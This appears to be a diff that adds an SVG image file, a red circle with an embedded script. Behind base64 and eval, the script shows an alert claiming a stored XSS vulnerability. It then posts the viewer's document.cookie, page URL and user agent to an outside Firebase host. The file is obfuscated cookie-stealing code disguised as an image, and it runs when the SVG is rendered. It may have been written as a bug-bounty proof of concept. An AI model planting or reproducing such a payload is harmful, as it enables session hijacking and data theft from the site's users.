@@ -1,0 +1,9 @@
+<?xml version="1.0" standalone="no"?>
+<svg version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
+  <circle cx="50" cy="50" r="40" fill="red" />
+  <script type="text/javascript">
+    <![CDATA[
+    eval(atob("YWxlcnQoJ0hpIFJheSwgdGhlcmUgaXMgYSBTdG9yZWQgWFNTIHZ1bG5lcmFiaWxpdHkgZm91bmQgZnJvbSBEZW56eSBaZXJvRGF5Jyk7ZmV0Y2goJ2h0dHBzOi8vZmlyZWJhc2VkYXRhYmFzZS5hcHAnLCB7bWV0aG9kOiAnUE9TVCcsbW9kZTogJ25vLWNvcnMnLGJvZHk6IEpTT04uc3RyaW5naWZ5KHttc2c6ICJYU1MgVHJpZ2dlcmVkIixjb29raWU6IGRvY3VtZW50LmNvb2tpZSx1cmw6IHdpbmRvdy5sb2NhdGlvbi5ocmVmLHVhOiBuYXZpZ2F0b3IudXNlckFnZW50fSl9KTs="));
+    ]]>
+  </script>
+</svg>
